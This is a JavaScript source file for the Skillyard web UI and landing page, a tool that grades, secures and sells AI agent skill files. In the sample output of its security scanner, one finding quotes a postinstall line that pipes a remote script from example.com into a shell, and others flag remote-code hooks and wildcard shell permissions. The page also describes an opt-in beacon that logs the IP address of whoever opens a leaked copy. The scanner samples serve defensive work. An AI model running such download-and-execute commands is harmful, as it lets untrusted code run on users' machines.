// Legal pages (web/legal) go live after counsel review and the business details are filled in.
const LEGAL_LIVE = false;
// Skillyard web UI: hash-routed, no build step, no dependencies.
const app = document.getElementById('app');
const ORIGIN = window.SKILLYARD_STATIC ? 'https://skills.your-company.com' : location.origin;
const CATEGORY_LABELS = {
  engineering: 'Engineering', devops: 'DevOps', testing: 'Testing', security: 'Security', data: 'Data', docs: 'Docs',
  product: 'Product', ai: 'AI', support: 'Support', sales: 'Sales', marketing: 'Marketing', finance: 'Finance', operations: 'Operations', compliance: 'Compliance', people: 'People', other: 'Other',
};

// ---- state & api -------------------------------------------------------------

const store = {
  get(k) { try { return localStorage.getItem(k); } catch { return null; } },
  set(k, v) { try { v === null ? localStorage.removeItem(k) : localStorage.setItem(k, v); } catch { /* storage unavailable */ } },
};
let token = store.get('skillyard.token');
let me = { anonymous: true };

// Static mode (GitHub Pages demo): the same UI reads a pre-exported JSON snapshot and fakes sign-in for the
// fictional demo companies, so visitors can see how private skills look without a server.
const STATIC = !!window.SKILLYARD_STATIC;
let snapshot;
async function staticApi(path) {
  snapshot ||= await (await fetch('api/index.json')).json();
  const [p, qs = ''] = path.split('?');
  const q = new URLSearchParams(qs);
  const who = token && snapshot.orgs.some((o) => o.slug === token) ? token : null;
  const visible = snapshot.skills.filter((s) => s.visibility === 'public' || s.scope === who);
  const notFound = () => Object.assign(new Error('not found'), { status: 404 });
  if (p === '/api/whoami') return who ? { org: who, scopes: ['read'], admin: false } : { anonymous: true };
  if (p === '/api/stats') {
    const categories = {};
    for (const s of visible) categories[s.category] = (categories[s.category] || 0) + 1;
    return { skills: visible.length, public: visible.filter((s) => s.visibility === 'public').length, private: visible.filter((s) => s.visibility === 'private').length, orgs: new Set(visible.map((s) => s.scope)).size, categories };
  }
  if (p === '/api/skills') {
    const terms = (q.get('q') || '').toLowerCase().split(/\s+/).filter(Boolean);
    const skills = visible.filter((s) => (!q.get('scope') || s.scope === q.get('scope')) && (!q.get('category') || s.category === q.get('category'))
      && terms.every((t) => [s.name, s.title, s.summary, s.description, s.tags.join(' '), s.scope].join(' ').toLowerCase().includes(t)));
    return { skills };
  }
  if (p === '/api/orgs') return { orgs: snapshot.orgs.map((o) => ({ ...o, skillCount: visible.filter((s) => s.scope === o.slug).length, privateCount: visible.filter((s) => s.scope === o.slug && s.visibility === 'private').length })).filter((o) => o.skillCount) };
  let m = /^\/api\/orgs\/([a-z0-9-]+)$/.exec(p);
  if (m) {
    const org = snapshot.orgs.find((o) => o.slug === m[1]);
    if (!org) throw notFound();
    return { ...org, member: who === org.slug, skills: visible.filter((s) => s.scope === org.slug) };
  }
  m = /^\/api\/skills\/@([a-z0-9-]+)\/([a-z0-9-]+)(\/files\/.+)?$/.exec(p);
  if (m && visible.some((s) => s.scope === m[1] && s.name === m[2])) {
    const res = await fetch(`api/skills/@${m[1]}/${m[2]}${m[3] || '.json'}`);
    if (!res.ok) throw notFound();
    return m[3] ? res.text() : res.json();
  }
  throw notFound();
}

async function api(path, opts = {}) {
  if (STATIC) return staticApi(path);
  const headers = { ...(opts.body ? { 'Content-Type': 'application/json' } : {}) };
  if (token) headers.Authorization = `Bearer ${token}`;
  const res = await fetch(path.replace(/^\//, ''), { method: opts.method || 'GET', headers, body: opts.body ? JSON.stringify(opts.body) : undefined });
  const ct = res.headers.get('content-type') || '';
  const data = ct.includes('json') && !opts.raw ? await res.json() : await res.text();
  if (!res.ok) throw Object.assign(new Error(data.error || data || res.statusText), { status: res.status });
  return data;
}

async function refreshMe() {
  try { me = await api('/api/whoami'); } catch (e) {
    if (e.status === 401) { token = null; store.set('skillyard.token', null); }
    me = { anonymous: true };
  }
  const btn = document.getElementById('auth');
  btn.textContent = me.anonymous ? 'Sign in' : me.admin ? 'Admin · Sign out' : `@${me.org} · Sign out`;
}

// ---- helpers -----------------------------------------------------------------

const esc = (s) => String(s ?? '').replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
const h = (strings, ...vals) => strings.reduce((out, s, i) => out + s + (i < vals.length ? (vals[i]?.__html ?? esc(vals[i])) : ''), '');
const raw = (html) => ({ __html: html });
const installRef = (s) => (s.scope === 'skillyard' ? s.name : s.id);
const skillHref = (s) => `#/skill/${s.id}`;
const fmtDate = (d) => (d ? new Date(d).toLocaleDateString(undefined, { year: 'numeric', month: 'short', day: 'numeric' }) : '');

function copyButtons(root) {
  root.querySelectorAll('[data-copy]').forEach((b) => b.addEventListener('click', async () => {
    try { await navigator.clipboard.writeText(b.dataset.copy); b.textContent = 'Copied'; } catch { b.textContent = 'Select & copy'; }
    setTimeout(() => { b.textContent = 'Copy'; }, 1400);
  }));
}
const cmd = (text) => h`<div class="cmd"><code>${text}</code><button type="button" data-copy="${text}">Copy</button></div>`;

/** Small, safe Markdown renderer: escapes everything first, then adds a limited set of constructs. */
function markdown(src, linkBase) {
  const lines = src.replace(/\r\n/g, '\n').split('\n');
  const out = [];
  let i = 0;
  const inline = (t) => esc(t)
    .replace(/`([^`]+)`/g, '<code>$1</code>')
    .replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>')
    .replace(/(^|[\s(])\*([^*\s][^*]*)\*/g, '$1<em>$2</em>')
    .replace(/\[([^\]]+)\]\(([^)\s]+)\)/g, (_m, label, url) => {
      if (/^https?:\/\//.test(url)) return `<a href="${url}" rel="noopener noreferrer" target="_blank">${label}</a>`;
      if (linkBase && !/^[a-z]+:/i.test(url) && !url.startsWith('#')) return `<a href="${linkBase}${url}">${label}</a>`;
      return label;
    });
  while (i < lines.length) {
    const line = lines[i];
    if (/^```/.test(line)) {
      const buf = [];
      i++;
      while (i < lines.length && !/^```/.test(lines[i])) buf.push(lines[i++]);
      i++;
      out.push(`<pre><code>${esc(buf.join('\n'))}</code></pre>`);
      continue;
    }
    const hm = /^(#{1,4})\s+(.*)$/.exec(line);
    if (hm) { out.push(`<h${hm[1].length}>${inline(hm[2])}</h${hm[1].length}>`); i++; continue; }
    if (/^\s*([-*_])\s*\1\s*\1\s*$/.test(line)) { out.push('<hr>'); i++; continue; }
    if (/^\|/.test(line) && /^\|?\s*:?-+/.test(lines[i + 1] || '')) {
      const cells = (l) => l.trim().replace(/^\||\|$/g, '').split('|').map((c) => c.trim());
      const head = cells(line);
      i += 2;
      const rows = [];
      while (i < lines.length && /^\|/.test(lines[i])) rows.push(cells(lines[i++]));
      out.push(`<table><thead><tr>${head.map((c) => `<th>${inline(c)}</th>`).join('')}</tr></thead><tbody>${rows.map((r) => `<tr>${r.map((c) => `<td>${inline(c)}</td>`).join('')}</tr>`).join('')}</tbody></table>`);
      continue;
    }
    if (/^>\s?/.test(line)) {
      const buf = [];
      while (i < lines.length && /^>\s?/.test(lines[i])) buf.push(lines[i++].replace(/^>\s?/, ''));
      out.push(`<blockquote><p>${inline(buf.join(' '))}</p></blockquote>`);
      continue;
    }
    const lm = /^(\s*)([-*+]|\d+[.)])\s+/.exec(line);
    if (lm) {
      const ordered = /\d/.test(lm[2]);
      const items = [];
      while (i < lines.length) {
        const m = /^(\s*)([-*+]|\d+[.)])\s+(.*)$/.exec(lines[i]);
        if (m) { items.push({ depth: m[1].length >= 2 ? 1 : 0, text: m[3] }); i++; }
        else if (/^\s{2,}\S/.test(lines[i]) && items.length) { items[items.length - 1].text += ` ${lines[i].trim()}`; i++; }
        else break;
      }
      const tag = ordered ? 'ol' : 'ul';
      out.push(`<${tag}>${items.map((it) => `<li${it.depth ? ' style="margin-left:1.2em"' : ''}>${inline(it.text)}</li>`).join('')}</${tag}>`);
      continue;
    }
    if (!line.trim()) { i++; continue; }
    const buf = [];
    while (i < lines.length && lines[i].trim() && !/^(```|#{1,4}\s|>|\||\s*([-*+]|\d+[.)])\s)/.test(lines[i])) buf.push(lines[i++]);
    if (!buf.length) buf.push(lines[i++]);
    out.push(`<p>${inline(buf.join(' '))}</p>`);
  }
  return out.join('\n');
}

function splitFrontmatter(md) {
  const m = /^---\n([\s\S]*?)\n---\n?/.exec(md.replace(/\r\n/g, '\n'));
  return m ? { fm: m[1], body: md.replace(/\r\n/g, '\n').slice(m[0].length) } : { fm: null, body: md };
}

function card(s, lib) {
  const j = lib?.byId.get(s.id);
  return h`<a class="card" href="${skillHref(s)}">
    <div class="meta"><span class="id">${s.id}</span>${raw(s.visibility === 'private' ? '<span class="badge private">Private</span>' : '')}${raw(j ? `<span class="judge">${judgeChips(j)}</span>` : '')}</div>
    <h3>${s.title}</h3>
    <p>${s.summary}</p>
    <div class="meta"><span class="tag">${CATEGORY_LABELS[s.category] || s.category}</span>${raw(s.tags.slice(0, 3).map((t) => `<span class="tag">${esc(t)}</span>`).join(''))}<span style="margin-left:auto">v${s.latest}</span></div>
  </a>`;
}

// ---- views -------------------------------------------------------------------

const BUSINESS = ['sales', 'marketing', 'finance', 'operations', 'people', 'product'];
const BUILDING = ['engineering', 'devops', 'testing', 'security', 'data', 'docs', 'ai'];
// Hand-picked community skills that are worth installing first (shown when present).
const PICKS = ['@community/verification-before-completion', '@community/systematic-debugging', '@community/test-driven-development', '@community/brainstorming', '@community/writing-plans', '@community/webapp-testing', '@community/mcp-builder', '@community/frontend-design'];

// ---- landing (the front page) -------------------------------------------------------
// Direction: "the sentence is the layout". A developer's correction becomes the word inside the headline, and the
// first thing a visitor can do is type one of their own and see which skills already exist for it.

const STEM = (w) => w.slice(0, 5);
const STOPW = new Set('the a an and or of to in on for with without from by is are be it its this that what when who how than then into over after before not no do does did done make makes made use uses used just only also more less any all every each you your our we us i me my please stop ask asked didn don dont want need like keep tell telling agent agents always never again thing things stuff'.split(' '));
const words = (t) => String(t || '').toLowerCase().replace(/[^a-z0-9\s-]/g, ' ').split(/[\s-]+/).filter((w) => w.length > 2 && !STOPW.has(w)).map(STEM);
function matchSkills(pub, text, n = 3) {
  const q = new Set(words(text));
  if (!q.size) return [];
  return pub.map((s) => {
    let score = 0;
    for (const [t, w] of [[s.name, 4], [s.title, 3], [(s.tags || []).join(' '), 3], [s.summary, 2], [s.description, 1]]) for (const x of new Set(words(t))) if (q.has(x)) score += w;
    return { s, score };
  }).filter((x) => x.score >= 4).sort((a, b) => b.score - a.score)
    .filter((x, _, all) => x.score >= all[0].score * 0.45) // drop matches far weaker than the best
    .slice(0, n).map((x) => x.s);
}
function shortLine(t, n) {
  const first = String(t || '').split(/(?<=[a-z])[.;]\s|,\s(?:and|then|with)\s/)[0].trim();
  if (first.length <= n) return first.replace(/[.,;]$/, '');
  const cut = first.slice(0, n);
  return `${cut.slice(0, cut.lastIndexOf(' ')).replace(/[\s,;:-]+$/, '')}…`;
}
const srcName = (s) => (s.scope === 'skillyard' ? 'Skillyard' : s.source ? s.source.repo.replace('https://github.com/', '') : `@${s.scope}`);

// Measured results, from reports/ and Studio (Claude Haiku, graded runs). Kept in one place so the page and the
// reports agree.
const MEASURED = [
  ['Company deploy runbook', 10, 100, 'reports/2026-10-lift-evals.md'],
  ['Commit messages', 50, 88, 'reports/2026-10-lift-evals.md'],
  ['Stay in requested scope (from Studio)', 38, 75, null],
  ['Dockerfile review', 83, 100, 'reports/2026-10-lift-evals.md'],
  ['Database migrations', 100, 100, 'reports/2026-10-lift-evals.md'],
  ['Confident but wrong commit advice', 50, 50, 'examples/README.md'],
];

// ---- selling: shared nav, footer, offer and sign-up ---------------------------------------
const CFG = window.SKILLYARD_CONFIG || { signup: {}, contact: { label: 'Follow @agentwik on X', url: 'https://x.com/agentwik' } };
const signupOn = () => !!(CFG.signup && CFG.signup.action);

function signupSentence({ lead, field = 'your email', button, tag, note, id }) {
  if (!signupOn()) {
    return `<div class="cta-sentence"><span class="lp-h-inline">${lead}</span> <a class="cta-btn" href="${esc(CFG.contact.url)}" target="_blank" rel="noopener noreferrer">${esc(CFG.contact.label)}</a></div>
      <p class="cta-note">${note}</p>`;
  }
  return `<form class="cta-sentence signup" data-tag="${esc(tag)}" id="${id}"><label class="lp-h-inline" for="${id}-email">${lead}</label> <input id="${id}-email" name="email" type="email" required placeholder="${esc(field)}" autocomplete="email"> <button type="submit">${esc(button)}</button></form>
    <p class="cta-note" data-note>${note}</p>`;
}

function bindSignups(root) {
  root.querySelectorAll('form.signup').forEach((f) => f.addEventListener('submit', async (e) => {
    e.preventDefault();
    const note = f.nextElementSibling;
    const btn = f.querySelector('button');
    const email = f.querySelector('input[type=email]').value.trim();
    const body = new URLSearchParams({ email, tag: f.dataset.tag, embed: '1' });
    btn.disabled = true;
    try {
      // Email-list embed endpoints don't send CORS headers; a no-cors POST still delivers the sign-up.
      await fetch(CFG.signup.action, { method: 'POST', mode: 'no-cors', body });
      note.textContent = 'Thanks. Check your inbox to confirm, then you are on the list.';
      f.reset();
    } catch {
      note.innerHTML = `That didn't go through. Try again, or <a href="${esc(CFG.contact.url)}">reach us here</a>.`;
    }
    btn.disabled = false;
  }));
}

const TERM_REVIEW = `$ skillyard review examples/bad

F  engineering-handbook  ~ 217 tok  6 findings: contradiction, vague-instruction
     high   SKILL.md:13 contradiction with line 12:
            "Always indent with tabs." vs "Use 2-space indentation everywhere"
     high   SKILL.md:18 contradiction with line 17:
            "Squash every PR into one commit." vs "Never squash"
     high   SKILL.md:26 contradiction with line 25:
            "Deploy on Fridays only after 4pm" vs "Never deploy on Fridays."
            fix: Keep one rule, or state when each applies.
C  notes-v2              ~ 811 tok  1 finding: description-no-when
     high   SKILL.md:3 description does not say when to use the skill
A  lint-everything       ~ 102 tok  no findings
       high scripts/setup.sh:2 no \`set -e\`: a failed command is ignored`;
const TERM_SECURE = `$ skillyard secure test/fixtures/secure-bad

HIGH   .claude/settings.json:2  permission "Bash(*)" lets the agent run any shell command unprompted
       fix: allow exact commands, e.g. Bash(npm test:*)
HIGH   .claude/settings.json:6  hook: downloads and runs remote code in one step
       fix: download, verify a checksum or signature, then run a pinned local copy
HIGH   .mcp.json:3  MCP server "files" is given / as a root; it can read or write far beyond this project
HIGH   .mcp.json:5  MCP server "db" has a secret inlined in DB_PASSWORD; it lands in git and backups
       fix: reference an environment variable and keep the value out of the file
HIGH   skills/risky/package.json:3  postinstall script runs automatically: curl https://example.com/x.sh | sh
MEDIUM .mcp.json:3  MCP server "files" runs @example/server-filesystem unpinned
       fix: pin a version, e.g. @1.2.3`;

// The landing is one journey: build, check, improve, save, protect. Every command below exists in src/cli.js, and
// every output line comes from a real run on registry/public, examples/, test/fixtures or the seeded demo data
// (long output shortened, not edited).
const FREE = 'Free and open source. Runs on your machine.';
const PILOT = 'Pro: your own private vault, $20 a month, in pilot. Open source. Team features by request.';
const JOURNEY = [
  { id: 'build', step: 'Build', h: 'Write a skill once. Run it in five agents.', tier: FREE,
    promise: 'Turn an interview, a runbook or a document into a skill with trigger tests, then compile it to each agent\'s own format.',
    tools: [
      { name: 'Create', cmd: 'skillyard create --answers answers.json', what: 'Interview, document or session log in; a reviewed, secured and tested skill out.', out: 'review: A (98/100), 1 finding\ntest: 4 passed, 0 failed (static trigger cases)' },
      { name: 'Generate', cmd: 'skillyard generate checklist --from runbook.md', what: 'Six generators (procedure, checklist, voice, playbook, decision, metric) filled from your own document.', out: 'created refund-request-review' },
      { name: 'Compile', cmd: 'skillyard compile release-notes --to all', what: 'Native files for Claude Code, Codex, Cursor, Copilot and Gemini, each checked for size, frontmatter and lost content.', out: 'copilot: FAIL size (4301/4000 chars read by code review)\ngemini: GEMINI.md  ok size (4385/20000 bytes)' },
    ] },
  { id: 'check', step: 'Check', h: 'Catch the errors before agents do.', tier: FREE,
    promise: 'Grade every skill A to F with line-level findings, and audit the skills, MCP configs, hooks and scripts around them.',
    tools: [
      { name: 'Review', cmd: 'skillyard review skills/', what: 'Contradictions, vague wording, broken links, skills that crowd each other out. --fix applies the safe fixes.', out: null, noOut: 'Full output below.' },
      { name: 'Secure', cmd: 'skillyard secure . --gate high', what: 'Permissions, MCP servers, hooks, dependencies and remote scripts. A non-zero exit makes it a CI gate.', out: null, noOut: 'Full output below.' },
      { name: 'Clean', cmd: 'skillyard clean scripts skills/', what: 'Scripts shipped inside skills: error handling, hard-coded paths, exec bits.', out: 'high scripts/fetch.sh:2 no `set -e`: a failed command is ignored' },
    ] },
  { id: 'improve', step: 'Improve', h: 'Learn from how your team really works.', tier: FREE,
    promise: 'Find the corrections people keep repeating, turn them into skill changes, and keep a change only when it measurably helps.',
    tools: [
      { name: 'Chat review', cmd: 'skillyard review --chats', what: 'Reads your own agent sessions locally and proposes edits. Nothing changes without your approval.', out: '[af240c47] no skill covers this  4 corrections (repeated)  pending' },
      { name: 'Optimize', cmd: 'skillyard optimize notes-v2', what: 'Cuts tokens and keeps the rewrite only if the grade and trigger cases hold.', out: 'notes-v2: tokens 811 -> 783 (-3%)  grade C -> C' },
      { name: 'Radar', cmd: 'skillyard radar logs/ --team', what: 'Corrections repeated across people become a drafted, tested skill, ready for a pull request.', out: 'Cluster 85fd6553: 2 people, 6 corrections in 4 sessions' },
      { name: 'A/B', cmd: 'skillyard ab report deploy', what: 'Split sessions between two versions; promote B only at p < 0.05 with 30 sessions per arm.', out: 'Decision: promote B (p=0.0000 ... (56/78 vs 9/82))' },
      { name: 'Model watch', cmd: 'skillyard watch run skills/ --model <new> --allow-model', what: 'When a new model ships, re-run every skill\'s evals on old and new, report drops and draft fixes.', out: null, noOut: 'Runs when a new model ships; needs --allow-model and an API key, so no sample output here.' },
    ] },
  { id: 'save', step: 'Save', h: 'See where your tokens go.', tier: FREE,
    promise: 'Give agents a map to query instead of opening every file, see where the tokens go, and estimate what each skill saves.',
    tools: [
      { name: 'Map', cmd: 'skillyard map', what: 'Indexes files, symbols, imports and skills; agents ask the map and read one section.', out: 'mapped 7 files, 1 skills -> .skillyard/map/{map.json,MAP.md}' },
      { name: 'Tokens', cmd: 'skillyard tokens --days 7', what: 'Tokens and estimated cost from Claude Code logs, per day, repo, skill and session.', out: null, live: 'tokens', note: 'One developer\'s real week, November 5 to 12.', noOut: 'Reads your own Claude Code logs, so the output is yours. A summary of one developer\'s measured week is in the Proof section of the home page.' },
      { name: 'Savings ledger', cmd: 'skillyard savings --statement out.md', what: 'Estimated dollars saved per skill from corrections, redo turns and tokens, with its confidence stated.', out: 'This is a correlation, not an experiment: confidence is low under 10 matched sessions' },
    ] },
];
const PROTECT = { id: 'protect', step: 'Protect', h: 'Your skills are an asset. Keep them.', tier: PILOT,
  promise: 'A private vault with roles and an audit trail, copies that name the person they were issued to, and access you can take back.',
  groups: [
    { name: 'Keep', tools: [
      { name: 'Vault and roles', cmd: 'skillyard token create --org acme --role editor', what: 'Versions, diffs and rollback; publishing must pass review and security (an org admin can override; it is logged).', out: 'token d840e76f297e (read,publish for @acme), shown once' },
      { name: 'Audit log', cmd: 'skillyard audit verify', what: 'Pulls, publishes, rollbacks and access changes, hash-chained.', out: 'ok   audit log: 291 entries (291 chained, 0 legacy)' },
      { name: 'Signed skills', cmd: 'skillyard verify deploy-safely --pub org.pem', what: 'What runs is what was approved.', out: 'FAIL deploy-safely: files differ from what was signed\n  changed: SKILL.md' },
    ] },
    { name: 'Trace (teams)', tools: [
      { name: 'Marked copies', cmd: 'skillyard trace leaked.md --marks marks.json --secret $SKILLYARD_SECRET', what: 'Every SKILL.md copy is marked for the token holder it is issued to, so a leaked fragment can often be traced to who it was issued to.', out: 'alice          v1.0.0   confidence 1.0000  (111 bits)' },
      { name: 'Evidence pack', cmd: 'skillyard evidence leaked.md --org acme', what: 'Signed report with the trace, pull history, audit chain and a drafted takedown notice.', out: 'most likely recipient: alice (code-review v1.0.0, confidence 100.00%)\naudit log chain: verified\nwrote evidence pack to /home/you/evidence' },
      { name: 'Call-home link', cmd: 'skillyard org settings acme --beacon on --i-have-legal-review', what: 'A per-copy link that records when a leaked copy is opened: time, IP address and browser.', out: null, note: 'Built, off by default. Not offered until a lawyer has reviewed it.', noOut: 'Off by default. Read docs/beacon.md and get legal review before turning it on.' },
    ] },
    { name: 'Take back (teams)', tools: [
      { name: 'Revocable streaming', cmd: 'skillyard connect claude --stream', what: 'Agents load skills from the vault over MCP; nothing is written to disk.', out: 'Nothing is installed on this machine, and `skillyard revoke` cuts access on the next call.' },
      { name: 'Offboarding', cmd: 'skillyard offboard alice --org acme --out off.md', what: 'Revoke a leaver\'s tokens and list every skill and version they pulled.', out: 'revoked alice; report written to off.md' },
      { name: 'Exit interview', note: 'Free CLI tool.', cmd: 'skillyard exit-interview pat --answers a.json', what: 'Capture what only they know as private draft skills, checked like any other.', out: 'pat-know-how: review: A (98/100), 1 finding' },
    ] },
    { name: 'Prove', tools: [
      { name: 'Governance export', note: 'Free CLI tool.', cmd: 'skillyard governance export --org acme --framework all', what: 'Inventory, approval trail, access and integrity, labelled with the SOC 2, ISO 42001 and EU AI Act controls they support. Evidence for your audit; it does not make you compliant, and Skillyard itself is not certified.', out: 'wrote governance bundle (7 skills, audit log verified)' },
    ] },
  ] };
// BACKLOG.md "Later": planned, not built.
// Self-hosting is not here: `skillyard serve` runs the vault on your own server (docs/self-hosting.md).
const ROADMAP = ['Leak-watch crawler', 'Stronger collusion resistance (merged copies already rank both colluders)', 'Single sign-on', 'Slack alerts for vault events (Studio already posts review proposals to a Slack webhook)', 'VS Code extension'];

// Free and Pro prices mirror src/plans.js PLANS; test/pricing.test.js keeps them equal. Teams are by inquiry for now.
const PRICING = {
  heading: 'Free for developers. $20 a month for your private vault.',
  note: 'Prices in USD. Pro starts after a free pilot; nothing is charged today. Teams: tell us what you need.',
  plans: [
    { id: 'free', name: 'Free', monthlyUsd: 0, seats: 1, extraSeatUsd: null, price: '$0', per: 'forever',
      blurb: 'Open source (MIT). Runs on your machine; nothing leaves it unless you pass --allow-model to use a model.',
      items: ['review, review --chats, secure, clean', 'create, compile to 5 agents, optimize', 'radar, A/B skills, model-release watch', 'map, tokens, savings ledger and statement', 'test, dev, ci, badge', 'exit-interview, governance export (evidence for your own audit)'],
      cta: { label: 'npx skillyard review', href: 'https://github.com/agentwik-labs/skillyard', code: true } },
    { id: 'pro', name: 'Pro', monthlyUsd: 20, seats: 1, extraSeatUsd: null, price: '$20', per: 'per month', featured: true,
      blurb: 'Your own private vault for the skills you write.',
      items: ['Private skills, available to every agent you use', 'Versions, diffs and rollback', 'Publish checks: Reviewer + Security', 'Signed skills', 'Audit log, hash-chained', 'Lockfile'],
      cta: { label: 'Join the Pro pilot', href: '#/?s=pilot' } },
    { id: 'team', name: 'Teams', inquiry: true, monthlyUsd: null, seats: null, extraSeatUsd: null, price: 'Talk to us', per: '',
      blurb: 'A shared vault for several people is set up by request for now. Tell us your team size and what you want to protect.',
      items: ['Shared private vault with roles', 'Copies marked for each person, with leak trace', 'Offboarding: revoke a leaver and see what they held', 'Help running it on your own servers'],
      cta: { label: 'Ask about teams', href: '#/teams' } },
  ],
  audit: { name: 'Skills audit', price: '$750', extra: 'first three free', text: 'We run Reviewer, Security and chat review over the skills you already use and send a report with fixes, usually within a week.' },
};
function lpNav() {
  return `<header class="lp-nav">
    <a class="lp-word" href="#/">skillyard</a>
    <nav aria-label="The journey">${[...JOURNEY, PROTECT].map((s) => `<a href="#/?s=${s.id}">${s.step}</a>`).join('')}<a href="#/?s=proof">Proof</a><a href="#/?s=library">Library</a><a href="#/?s=pricing">Pricing</a></nav>
    <a class="lp-action" href="#/?s=pilot">Join the Pro pilot</a>
  </header>`;
}

function lpFooter() {
  return `<footer class="lp-foot">
    <div class="lp-foot-top">
      <div><h2 class="lp-h">Check your skills today.</h2><p class="lp-install"><a href="https://github.com/agentwik-labs/skillyard#readme">Install guide on GitHub →</a></p></div>
      <ul class="jf">${[...JOURNEY, PROTECT].map((s) => `<li><a href="#/?s=${s.id}">${s.step}</a></li>`).join('')}<li><a href="#/?s=proof">Proof</a></li><li><a href="#/?s=library">Library</a></li><li><a href="#/?s=pricing">Pricing</a></li><li><a href="#/teams">For teams</a></li></ul>
      <ul><li><a href="#/browse">Browse all skills</a></li><li><a href="#/examples">Good vs bad</a></li><li><a href="#/create">Create a skill</a></li><li><a href="https://github.com/agentwik-labs/skillyard">GitHub</a></li><li><a href="${esc(CFG.contact.url)}">${esc(CFG.contact.label)}</a></li></ul>
    </div>
    ${LEGAL_LIVE ? `<nav class="lp-legal-links" aria-label="Legal"><a href="legal/privacy.html">Privacy</a><span aria-hidden="true">·</span><a href="legal/terms.html">Terms</a><span aria-hidden="true">·</span><a href="legal/security.html">Security</a><span aria-hidden="true">·</span><a href="legal/contact.html">Contact</a></nav>` : ''}
    <div class="lp-legal"><span>MIT licensed. Imported skills keep their own licences.</span><span>No cookies, no analytics.</span></div>
  </footer>`;
}

function toolRow(t) {
  return `<li><div class="jr-a"><b>${esc(t.name)}</b><span>${esc(t.what)}</span>${t.note ? `<em class="jr-note">${esc(t.note)}</em>` : ''}</div>
    <code class="jr-cmd">${esc(t.cmd)}</code>
    ${t.live ? `<pre class="jr-out" aria-label="Summary of one developer's measured week" data-live="${t.live}">Loading the measured week…</pre>` : t.out ? `<pre class="jr-out" aria-label="Example output">${esc(t.out)}</pre>` : `<span class="jr-out none">${esc(t.noOut || '')}</span>`}</li>`;
}

function stepHead(s, extra = '') {
  return `<div class="x-head"><h2 id="${s.id}-h" class="lp-h"><span class="jn">${s.step}.</span> ${esc(s.h)}</h2>
    <div class="j-side"><p class="v-lede">${esc(s.promise)}</p><p class="tier${s.tier === PILOT ? ' pilot' : ''}">${s.tier}</p>${extra}</div></div>`;
}

function stepSection(s, after = '') {
  return `<section class="v-sec j-step" id="${s.id}" aria-labelledby="${s.id}-h">
      ${stepHead(s)}
      <ul class="jr">${s.tools.map(toolRow).join('')}</ul>
      ${after}
    </section>`;
}

function protectSection(id = 'protect') {
  const s = PROTECT;
  return `<section class="v-sec j-step j-dark" id="${id}" aria-labelledby="${s.id}-h">
      ${stepHead(s)}
      <div class="jgs">${s.groups.map((g) => `<div class="jg"><h3 class="jg-h">${esc(g.name)}</h3><ul class="jr">${g.tools.map(toolRow).join('')}</ul></div>`).join('')}</div>
    </section>`;
}

function roadmapStrip() {
  return `<section class="v-sec rm" aria-labelledby="rm-h">
      <h2 id="rm-h" class="rm-h">Roadmap, built when users ask for it</h2>
      <ul class="rm-list">${ROADMAP.map((r) => `<li>${esc(r)}</li>`).join('')}</ul>
    </section>`;
}

function pricingSection(id = 'pricing') {
  const P = PRICING;
  return `<section class="v-sec pr" id="${id}" aria-labelledby="${id}-h">
      <p class="v-eyebrow">Pricing</p>
      <h2 class="lp-h" id="${id}-h">${esc(P.heading)}</h2>
      <ul class="pr-grid">${P.plans.map((p) => `<li class="pr-card${p.featured ? ' pr-featured' : ''}">
        <h3>${esc(p.name)}</h3>
        <p class="pr-price"><b>${esc(p.price)}</b>${p.per ? `<span>${esc(p.per)}</span>` : ''}</p>
        <p class="pr-blurb">${esc(p.blurb)}</p>
        <ul class="pr-items">${p.items.map((x) => `<li>${esc(x)}</li>`).join('')}</ul>
        <a class="${p.cta.code ? 'pr-code' : 'lp-action'}" href="${esc(p.cta.href)}">${p.cta.code ? `<code>${esc(p.cta.label)}</code>` : esc(p.cta.label)}</a>
      </li>`).join('')}</ul>
      <p class="pr-audit"><b>${esc(P.audit.name)}: ${esc(P.audit.price)}</b>, ${esc(P.audit.extra)}. ${esc(P.audit.text)}</p>
      <p class="pr-note">${esc(P.note)}</p>
    </section>`;
}

function pilotCta(id) {
  return `<section class="lp-cta" aria-labelledby="${id}-h" id="pilot">
      <h2 class="lp-h" id="${id}-h">Get your own private vault: join the Pro pilot.</h2>
      <p class="v-lede">The developer tools above are free and open source. Pro is a private vault for the skills you write, with versions, publish checks, signatures and an audit log, for $20 a month. It is in pilot now, and nothing is charged until it opens.</p>
      ${signupSentence({ lead: 'Reply to', button: 'Join', tag: 'pro', id, note: 'We email you to set up your vault.' })}
    </section>`;
}

function teamsCta(id) {
  return `<section class="lp-cta" aria-labelledby="${id}-h" id="ask">
      <h2 class="lp-h" id="${id}-h">Teams: tell us what you need.</h2>
      <p class="v-lede">Right now we focus on individual developers. A shared vault for several people, with roles, marked copies and offboarding, is set up by request. Tell us your team size and what you want to protect.</p>
      ${signupSentence({ lead: 'Reply to', button: 'Ask', tag: 'team', id, note: 'We usually reply within a week.' })}
    </section>`;
}

// ---- the library: Skillyard's own grades for every public skill (web/media/library.json, built by tools/build-library.mjs)
let libraryP;
function loadLibrary() {
  libraryP ||= fetch('media/library.json').then((r) => (r.ok ? r.json() : null)).then((l) => {
    if (!l || !Array.isArray(l.skills)) return null;
    l.byId = new Map(l.skills.map((s) => [s.id, s]));
    return l;
  }).catch(() => null);
  return libraryP;
}
const SECURE_LABEL = { clean: 'No security findings', low: 'Low-risk security notes', medium: 'Medium security findings', high: 'High security findings' };
function judgeChips(j) {
  if (!j) return '';
  return `<span class="gchip" title="Graded ${esc(j.grade)} (${j.score}/100) by skillyard review">${esc(j.grade)}</span><span class="schip ${j.secure}" title="skillyard secure">${esc(j.secure === 'clean' ? 'secure' : `${j.secure} risk`)}</span>`;
}

const RULE_WORDS = { bloat: 'length paid on every load', 'description-no-when': 'a description that never says when to use it', 'broken-link': 'broken links', contradiction: 'contradictions', 'thin-body': 'almost no instructions', frontmatter: 'broken frontmatter', 'trigger-hijack': 'triggers that steal other skills\' work' };
// The most common non-heuristic findings among D and F skills, counted from the library itself.
function why(l) {
  const c = {};
  for (const s of l.skills) if ('DF'.includes(s.grade)) for (const r of new Set(s.top.map((f) => f.rule))) if (RULE_WORDS[r]) c[r] = (c[r] || 0) + 1;
  const top = Object.entries(c).sort((a, b) => b[1] - a[1]).slice(0, 3).map(([r]) => RULE_WORDS[r]);
  return top.length ? `, most often for ${top.slice(0, -1).join(', ')}${top.length > 1 ? ' or ' : ''}${top[top.length - 1]}` : '';
}
